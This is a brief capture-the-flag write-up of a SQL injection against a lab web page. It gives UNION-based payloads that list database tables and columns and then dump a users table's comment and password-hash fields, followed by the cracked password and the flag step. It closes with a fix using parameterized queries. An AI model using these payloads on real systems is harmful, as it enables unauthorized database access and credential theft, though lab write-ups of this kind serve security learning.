We go to this page: http://10.12.248.13/?page=member
We want to see all the table names in order to do a UNION query to retrieve more information.
We query information_schema with this:
1 OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns;
We get:
First name: users
Surname : user_id

First name: users
Surname : first_name

First name: users
Surname : last_name

First name: users
Surname : town

First name: users
Surname : country

First name: users
Surname : planet

First name: users
Surname : Commentaire

First name: users
Surname : countersign

We check all fields then end up finding what we need in Commentaire and countersign. So we run this query:
1 OR 1=1 UNION SELECT Commentaire,countersign FROM users;

We get:
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

Decrypted:
FortyTwo

We encrypt it in sha256 and we get the flag.

This could have been fixed by checking the request sent by the user to not execute the SQL, by using parametrized requests so that the input string isn't treated
as SQL.
